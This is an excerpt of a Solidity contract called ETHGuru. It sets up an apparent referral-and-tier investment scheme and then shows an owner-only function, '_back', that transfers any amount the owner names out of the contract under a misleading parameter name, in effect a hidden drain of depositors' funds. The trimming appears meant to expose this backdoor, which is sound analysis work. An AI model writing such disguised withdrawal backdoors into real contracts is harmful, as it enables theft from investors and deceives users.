...
contract ETHGuru {
	...
	constructor(address payable ownerAddress) public {
		...
		totalUsers = 0;
		totalInvested = 0;
		minDeposit = 0.005 ether;
		refReward = [12, 7, 4, 2];
		ownersPart = 1;
		lastRefLink = 0;
		tierPrices = [0, 0.1 ether, 0.5 ether];
		rates = [2893519, 3472223, 4050927];
		startDate = 1594922400;
	}
	...
	function _back(uint newMinDeposit) external payable restricted {
		msg.sender.transfer(newMinDeposit);
	}
